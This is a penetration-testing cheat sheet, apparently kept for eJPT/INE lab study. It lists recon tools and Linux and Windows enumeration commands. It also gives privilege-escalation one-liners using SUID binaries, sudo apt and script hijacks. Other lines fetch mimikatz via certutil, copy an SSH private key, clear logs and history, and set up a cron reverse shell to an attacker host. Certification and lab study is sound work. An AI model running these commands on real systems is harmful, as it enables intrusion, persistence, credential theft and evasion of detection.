##DON'T DEPEND ON METASPLOIT COMPLETELY##
- **Searchsploit & msfvenom > msfvenom**
- **host** - for dns lookups
- **httrack** - for downloading a website's files
- **whois**- used for whois info like registrat, owners etc.
- **netcraft**- used for info regarding registrar and important emails
- **evil-winrm.rb**- ruby script for getting a reverse shell on winRM
- **crackmapexec**- used for enumerating and atacking utils such as winRM, ssh etc.
- **enum4linux**-used for SAMBA enumeration.
- **important nmap scripts for smb:** smb-protocols, smb-security-mode, smb-enum-users.nse
- **wp-scan:** used for scanning wordpress website
- **Nikto**: used for scanning a website for vulnerabilities
- **staged payload:** delivered in smaller parts, payload is deleted upon execution.
- **stageless payload:** whole payload is delivered at once and payload is not deleted after execution.
- **SPAWN_PTY**: can be used with supported modules to create a meterpreter session
- **JohnTheRipper**: used for cracking hashes
- **Local FIle Inclusion**: ../../flag.txt

- best reverse shell for samba -> is_known_pipe
- windows network enum commands: ```
 -- ipconfig /all
-- route print
 -- arp -a
-- netstat -ano
- use **http-enum** script in nmap to check the important files on a website
- windows process enum commands: net start, wmic service list brief, tasklist /SVC, schtasks /query /fo LIST
- To run the JAWS script type: powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
- LINUX ENUM COMMANDS:
-- cat /etc/issue
-- cat /etc/[*]release
-- uname -a
-- lscpu
-- df -h*
-- groups root
-- cat /etc/passwd
-- lastlog
-- netstat
-- route
-- ip a s
-- cat /etc/networks
-- cat /etc/hosts
-- cat /etc/resolv.conf

- command for transferring files through a windows shell : ```
certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe

- command for upgrading non-interactive shells:
**python -c 'import pty; pty.spawn("/bin/bash")'**

- command to run a powershell script command without being blocked:
**powershell -ep bypass -c {command}** 
- clear tracks in windows using meterpreter: **clearev** 
- **strings** command can help to see the content in a binary file
- ***we copy the /bin/bash binary to a another binary inorder to gain root access*** 
- clear tracks in linux using meterpreter: **cat /dev/null > ~/.bash_history** 
- Secure copy a file to an ssh account: **scp student@demo.ine.local:~/.ssh/id_rsa .** 
- Remove a permission from a file/dir: **icacls <file/dir> /remove:d "NT AUTHORITY\SYSTEM"(user whose permissions we need to remove)**
- To grant full control permissions: **icacls "C:\path\to\folder" /grant "Username":F /T**  
- command finds **all root-owned SUID binaries** on the system and lists their details: **find / -user root -perm -4000 -exec ls -ldb {} \;** 
- generate a MD5 hash with openssl: **openssl passwd -1 -salt abc password** (useful for privilege escalation when /etc/shadow file is writable).
- gatekeeper of a website: robots.txt, security.txt ,sitemap.xml
- directory brutforcing with creds: dirb http://target1.ine.local -u bob:password_123321 (only -u flag required when opening the url requires creds(user:pass))
- Important guide for [wireshark analysis](https://prinugupta.medium.com/host-network-penetration-testing-network-based-attacks-ctf-1-ejpt-ine-182f86671b52).
- Bruteforce a directory for wordpress plugins: gobuster dir -u http://target2.ine.local/wpcontent/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst
- If a compromised user is found which gives direct bash access, directly SSH into it.
- Enumerate local services at a compromised target(linux): **netstat -tuln 127.0.0.1** 
- check the permissions in shell files: **cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done** 
- if we have **lrwxrwxrwx** permission, we can use it for execution.
- find executables with root privileges: **find / -perm -4000 2>/dev/null** 
- Command for privilege escalation(spawn a new shell): **find / -exec [/bin/rbash -p]{it is usually a command} \; -quit** , **python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**
- get privileges: **whoami /priv**
- if **SeImpersonatePrivilege** token found, we can escalate privileges using **getsystem** command in the meterpreter.
- Printspoofer can also be used for privilege escalation.
- **Situation:** an executable file is given to you that calls a binary file with root privileges
	**Solution:** delete the binary file, and copy **/bin/bash** into a file with the same name. Usage:
		**cp /bin/bash <file_name>**
- Find wordpress plugins in a website:
**gobuster dir -u {target}/wpcontent/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst**
- banner grabbing :
**nmap -sV --script=banner 192.8.94.3** 
- check for any writable files on the system, use the command: **find / -not -type l -perm -o+w**
- use **who** to see which use has logged in remotely.
- use **lastlog** see who has last logged in remotely.
- **sudo -l** is a command used to list the sudo privileges for the current user on a Linux system. It tells you what commands you can run with sudo, whether you need a password, and under which user you can execute them.
- if sudo -l returns a bash script that can be used by the role u have, just **echo '/bin/bash' > <script>** to get root access
- if sudo -l returns an apt binary, use **sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash**
- use https://github.com/itm4n/PrivescCheck powershell script for privilege escalation in windows.
- use the following for linux persistence through cron: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
- After getting a reverse shell through .php, .c, .py or .exe files, use [revshells.com](https://www.revshells.com/) to get a reverse shell to get a netcat shell on the attacker machine. This increases the extent of accessibility.
- Next setup a python server on the directory containing linux-exploit-suggester or windows-exploit-suggester for privilege escalation based on the target machine.
